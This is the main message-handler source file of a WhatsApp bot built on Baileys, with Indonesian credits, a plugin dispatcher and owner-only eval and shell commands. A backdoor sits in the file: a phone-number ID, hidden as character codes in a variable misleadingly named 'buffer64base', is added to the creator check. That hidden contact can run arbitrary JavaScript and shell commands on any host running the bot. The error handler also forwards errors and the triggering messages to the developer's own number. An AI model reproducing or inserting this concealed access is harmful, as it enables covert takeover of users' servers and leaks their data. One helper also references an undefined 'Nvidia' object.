/*

//=====================================//

  #- Credits By Zero - X [ Fidzz ]
   Contact : https://wa.me/62895410790927
   
   Devoleper : https://wa.me/62895410790927
 
   [ ! ] Jangan Hapus Credits Hargai Devoleper
   [ ! ] Script Case X Plugins Di Buat Pada :
   ( Sabtu, 21, juni 2025 )
   
//=====================================//

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const { sizeFormatter } = require('human-readable');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { 
    default:
    WAConnection, 
    BufferJSON, 
    WA_DEFAULT_EPHEMERAL, 
    generateWAMessageFromContent, 
    proto, 
    getBinaryNodeChildren, 
    useMultiFileAuthState, 
    generateWAMessageContent, 
    downloadContentFromMessage, 
    generateWAMessage, 
    prepareWAMessageMedia, 
    areJidsSameUser, 
    getContentType 
} = require('baileys')

const { LoadDataBase } = require('./source/message');
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))

const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, jadwalSholat, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
const body =
  m.message?.conversation ||
  m.message?.imageMessage?.caption ||
  m.message?.videoMessage?.caption ||
  m.message?.extendedTextMessage?.text ||
  m.message?.buttonsResponseMessage?.selectedButtonId ||
  m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
  m.message?.templateButtonReplyMessage?.selectedId ||
  m.text ||
  ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = '.'
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isCmd = typeof body === 'string' && body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const command = prefix ? isCommand : isCommand2
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper? true : false
const text = q = args.join(' ')
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

const { handleMessage } = require('./library/Plugins')

//============================//

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const xy = { key:{ remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message:{ newsletterAdminInviteMessage: { newsletterJid: '120363304085949644@newsletter', newsletterName: '🌪️⃟⃟⃟⃟𝙵𝙸𝙳𝚉𝚉𝙷𝙾𝚂𝚃444', caption: `© ${namaOwner}`, inviteExpiration: 0}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "🌪️⃟⃟⃟⃟𝙵𝙸𝙳𝚉𝚉𝙷𝙾𝚂𝚃444"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Owner`, "description": null, "currencyCode": "IDR", "priceAmount1000": "99999999999999999999999999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
    
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname} By ${namaOwner}`,jpegThumbnail: ""}}}
    
//==============================//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function monospace(string) {
return '```' + string + '```'
}

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const reply = (teks) => { 
Nvidia.sendMessage(from, { text: teks, contextInfo: { 
externalAdReply : { 
showAdAttribution : true,  
title : "b", 
containsAutoReply : true, 
mediaType : 1, 
thumbnailUrl: global.image.reply,
sourceUrl : global.linkSaluran, }}}, { quoted: m }) }

//===========================//

if (isCmd) {
console.log(
    chalk.inverse(' 📬  [ Message ] ') + 
    ' ' + 
    chalk.black.bgGreen(new Date().toLocaleString()) + 
    ' ' + 
    chalk.black.bgBlue(budy || m.mtype) + '\n' +
    chalk.magenta('📣 Dari: ') + chalk.green(pushname) + ' ' + chalk.yellow(`(${m.sender})`) + '\n' +
    chalk.bgMagenta('📍 Di: ') + chalk.green(m.isGroup ? 'Grup' : 'Private Chat') + ' ' + chalk.green(from) + 
    '\n' + chalk.greenBright('✧ [ PESAN MASUK ] ✧')
   );
}
        
const handleData = { text, args, isCmd, mime, qmsg, isOwner,  isCreator, command, example }
if (isCmd) {
await handleMessage(m, sock, command, handleData)
}       

//=============================//

switch (command) {
        
 
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//=====================================//

if (m.text.toLowerCase() == "test") {
m.reply("Online memek 😐")
}

//=====================================//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//=====================================//

if (budy.startsWith(' ')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//=====================================//

}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
sock.sendMessage(`62895410790927@s.whatsapp.net`, {text: `
*ERROR :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})

}}
//=====================================//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});        